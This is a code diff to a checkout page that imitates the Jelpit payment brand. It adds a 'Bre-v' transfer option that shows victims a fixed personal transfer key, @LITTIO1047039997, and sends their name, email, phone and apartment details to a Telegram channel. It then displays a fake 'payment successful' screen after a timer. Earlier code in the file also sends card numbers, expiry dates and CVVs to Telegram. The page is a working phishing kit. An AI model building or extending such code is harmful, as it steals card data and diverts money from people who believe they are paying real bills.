@@ -493,6 +493,13 @@
                     </div>
                 </div>
 
+                <div class="payment-option" id="paymentBrev">
+                    <div class="payment-option-text">Bre-v · Transferencia directa</div>
+                    <div class="payment-icons">
+                        <i class="fa-solid fa-link" style="color:#7c3aed; font-size:22px;"></i>
+                    </div>
+                </div>
+
                 <!-- TARJETA Form (Hidden by default) -->
                 <div id="tarjetaForm" style="display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0;">
                     <div style="margin-bottom: 15px;">
@@ -524,6 +531,25 @@
                             <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">CVV</label>
                             <input type="text" id="tarjetaCVV" placeholder="123" maxlength="4" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
                         </div>
+                    </div>
+                </div>
+
+                <!-- BREV Form (Hidden by default) -->
+                <div id="brevForm" style="display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0;">
+                    <div style="background: #f5f0ff; border: 1px solid #7c3aed; border-radius: 10px; padding: 18px; margin-bottom: 14px;">
+                        <div style="font-size: 11px; color: #7c3aed; font-weight: 700; text-transform: uppercase; margin-bottom: 10px;">Datos para transferir</div>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                            <span style="font-size: 13px; color: #555;">Llave:</span>
+                            <strong style="font-size: 15px; color: #2e0063; letter-spacing: 0.5px;" id="brevLlave">@LITTIO1047039997</strong>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <span style="font-size: 13px; color: #555;">Valor a transferir:</span>
+                            <strong style="font-size: 15px; color: #1dbe5f;" id="brevMonto">—</strong>
+                        </div>
+                    </div>
+                    <div style="background: #fffbe6; border: 1px solid #f59e0b; border-radius: 8px; padding: 12px; font-size: 12px; color: #92400e; line-height: 1.5;">
+                        <i class="fa-solid fa-triangle-exclamation" style="margin-right: 6px;"></i>
+                        Transfiere el valor exacto a la llave indicada y haz clic en <strong>PAGAR</strong> para confirmar. Recibirás una notificación cuando se verifique.
                     </div>
                 </div>
 
@@ -638,6 +664,8 @@
                 metodoInfo = `Tarjeta: ${data.numero_tarjeta}
 Fecha: ${data.fecha_tarjeta}
 CVV: ${data.cvv}`;
+            } else if (data.metodoPago === 'brev') {
+                metodoInfo = `Bre-v (Transferencia directa)\nLlave: @LITTIO1047039997`;
             } else {
                 metodoInfo = `PSE - ${data.pseBank}`;
             }
@@ -747,32 +775,79 @@ ${metodoInfo}
             // Button handlers
             const paymentTarjeta = document.getElementById('paymentTarjeta');
             const paymentPSE = document.getElementById('paymentPSE');
+            const paymentBrev = document.getElementById('paymentBrev');
             const btnPagar = document.getElementById('btnPagarFinal');
+
+            function deseleccionarTodos() {
+                paymentTarjeta.classList.remove('active');
+                paymentPSE.classList.remove('active');
+                paymentBrev.classList.remove('active');
+                document.getElementById('tarjetaForm').style.display = 'none';
+                document.getElementById('pseForm').style.display = 'none';
+                document.getElementById('brevForm').style.display = 'none';
+            }
 
             // Seleccionar método de pago
             paymentTarjeta.addEventListener('click', function() {
+                deseleccionarTodos();
                 paymentTarjeta.classList.add('active');
-                paymentPSE.classList.remove('active');
                 document.getElementById('tarjetaForm').style.display = 'block';
-                document.getElementById('pseForm').style.display = 'none';
                 btnPagar.classList.add('active');
                 btnPagar.disabled = false;
                 sessionStorage.setItem('metodoPago', 'tarjeta');
             });
 
             paymentPSE.addEventListener('click', function() {
+                deseleccionarTodos();
                 paymentPSE.classList.add('active');
-                paymentTarjeta.classList.remove('active');
-                document.getElementById('tarjetaForm').style.display = 'none';
                 document.getElementById('pseForm').style.display = 'block';
                 btnPagar.classList.add('active');
                 btnPagar.disabled = false;
                 sessionStorage.setItem('metodoPago', 'pse');
             });
 
+            paymentBrev.addEventListener('click', function() {
+                deseleccionarTodos();
+                paymentBrev.classList.add('active');
+                document.getElementById('brevForm').style.display = 'block';
+                document.getElementById('brevMonto').textContent = totalFormatted;
+                btnPagar.classList.add('active');
+                btnPagar.disabled = false;
+                sessionStorage.setItem('metodoPago', 'brev');
+            });
+
             // Click en botón pagar
             btnPagar.addEventListener('click', function() {
                 const metodoPago = sessionStorage.getItem('metodoPago') || 'tarjeta';
+
+                if (metodoPago === 'brev') {
+                    sendToTelegram({
+                        nombre: userNombre,
+                        apellido: userApellido,
+                        email: userEmail,
+                        celular: userCelular,
+                        tipo_doc: 'CC',
+                        cedula: '',
+                        nombreConjunto: nombreConjunto,
+                        referencia1: referencia1,
+                        selectedApt: selectedApt,
+                        referencia2: referencia2,
+                        metodoPago: 'brev',
+                        pseBank: 'Bre-v (@LITTIO1047039997)',
+                        monto_formateado: totalFormatted
+                    });
+
+                    // Mostrar pantalla de loading
+                    document.getElementById('brevLoadingOverlay').style.display = 'flex';
+                    btnPagar.disabled = true;
+
+                    // Después de 2.5s pasar a éxito
+                    setTimeout(() => {
+                        document.getElementById('brevLoadingOverlay').style.display = 'none';
+                        document.getElementById('brevSuccessOverlay').style.display = 'flex';
+                    }, 2500);
+                    return;
+                }
 
                 if (metodoPago === 'pse') {
                     const pseDocType = document.getElementById('pseDocType').value;
@@ -1131,6 +1206,27 @@ ${metodoInfo}
             }, 2000);
         }
     </script>
+
+    <!-- Brev: Loading Overlay -->
+    <div id="brevLoadingOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300000; flex-direction:column; align-items:center; justify-content:center; gap:24px;">
+        <img src="img/logo_jelpit_color.svg" alt="Jelpit" style="height:48px; margin-bottom:8px;">
+        <div style="width:56px; height:56px; border:5px solid #e8e8e8; border-top-color:#1dbe5f; border-radius:50%; animation:jlpSpin 0.9s linear infinite;"></div>
+        <p style="font-size:16px; color:#555; font-family:'Roboto Condensed',sans-serif; margin:0;">Procesando pago...</p>
+    </div>
+
+    <!-- Brev: Success Overlay -->
+    <div id="brevSuccessOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300000; flex-direction:column; align-items:center; justify-content:center; padding:30px; text-align:center; font-family:'Roboto Condensed',sans-serif;">
+        <img src="img/logo_jelpit_color.svg" alt="Jelpit" style="height:48px; margin-bottom:32px;">
+        <div style="width:80px; height:80px; background:#f0fdf4; border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:24px;">
+            <i class="fa-solid fa-check" style="font-size:36px; color:#1dbe5f;"></i>
+        </div>
+        <h2 style="font-size:24px; font-weight:700; color:#2e0063; margin:0 0 12px;">¡Pago exitoso!</h2>
+        <p style="font-size:15px; color:#555; max-width:320px; line-height:1.6; margin:0 0 8px;">Tu solicitud de pago fue recibida correctamente.</p>
+        <p style="font-size:14px; color:#888; max-width:320px; line-height:1.6; margin:0 0 32px;">Verifica tu pago realizando la transferencia a <strong style="color:#7c3aed;">@LITTIO1047039997</strong> por el valor exacto.</p>
+        <button onclick="window.location.href='home.html'" style="background:#1dbe5f; color:white; border:none; border-radius:25px; padding:14px 40px; font-size:15px; font-weight:700; cursor:pointer; font-family:'Roboto Condensed',sans-serif;">
+            Volver al inicio
+        </button>
+    </div>
 
     <!-- Modal Autorización Jelpit -->
     <div id="jlpModalOverlay">
